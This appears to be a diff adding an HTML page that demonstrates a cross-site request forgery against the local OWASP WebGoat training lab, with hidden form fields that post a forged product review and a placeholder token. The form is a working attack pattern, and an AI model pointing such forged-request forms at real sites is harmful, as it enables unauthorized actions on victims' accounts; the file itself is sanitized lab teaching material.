@@ -1,0 +1,26 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>WebGoat CSRF Review Demo</title>
+</head>
+<body>
+  <h1>CSRF Review Demo</h1>
+
+  <form method="POST"
+        action="http://localhost:8080/WebGoat/csrf/review"
+        target="_blank">
+
+    <input type="hidden" name="reviewText" value="Local WebGoat lab test">
+    <input type="hidden" name="stars" value="5">
+    <input type="hidden" name="validateReq" value="DEMO_TOKEN">
+
+    <button type="submit">Submit local lab request</button>
+  </form>
+
+  <p>
+    Sanitized example from a local OWASP WebGoat lab. The session specific
+    validation value used during the exercise is not included.
+  </p>
+</body>
+</html>
